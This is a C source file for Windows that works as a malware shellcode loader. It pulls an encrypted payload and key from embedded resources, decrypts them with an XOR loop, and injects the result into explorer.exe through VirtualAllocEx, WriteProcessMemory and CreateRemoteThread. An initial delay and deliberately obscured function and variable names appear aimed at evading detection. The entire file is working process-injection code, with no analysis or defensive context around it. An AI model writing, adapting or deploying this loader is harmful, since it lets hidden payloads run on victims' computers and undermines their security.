#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")
#include <tlhelp32.h>

void lauderes(const char* resName, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);

    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}







void xdecman(char* co1d, DWORD co1dlen, unsigned char* kesu, DWORD key1en) {
    for (DWORD masu = 0; masu < co1dlen; masu++) {
        co1d[masu] ^= kesu[masu % key1en]; 
    }
}


int main() {
    Sleep(2000);
    
    char* AESkey;
    DWORD AESkeyLen;
    lauderes("AESKEY", &AESkey, &AESkeyLen);

    char* AESCode;
    DWORD AESCodeLen;
    lauderes("AESCODE", &AESCode, &AESCodeLen);
    
    
    PROCESSENTRY32 pe32;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    Process32First(snapshot, &pe32);
    const char *tarproces = "explorer.exe";
    while(Process32Next(snapshot, &pe32)) {
       if (strcmp(pe32.szExeFile, tarproces) == 0){
              HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
              
              LPVOID melloo = VirtualAllocEx(hProcess, NULL, AESCodeLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
              //dhanushaes(AESCode, AESCodeLen, AESkey, AESkeyLen);
              xdecman(AESCode, AESCodeLen, AESkey , AESkeyLen);
             
              WriteProcessMemory(hProcess, melloo, AESCode, AESCodeLen, NULL);
             
             

             HANDLE tHandle = CreateRemoteThread(hProcess , NULL, 0, (LPTHREAD_START_ROUTINE)melloo, NULL, 0, NULL);
             WaitForSingleObject(tHandle, INFINITE);
             
              VirtualFreeEx(hProcess, melloo, 0, MEM_RELEASE);
           
              CloseHandle(tHandle);
           
              CloseHandle(hProcess);
              
              break;

         }
      }

    return 0;
}
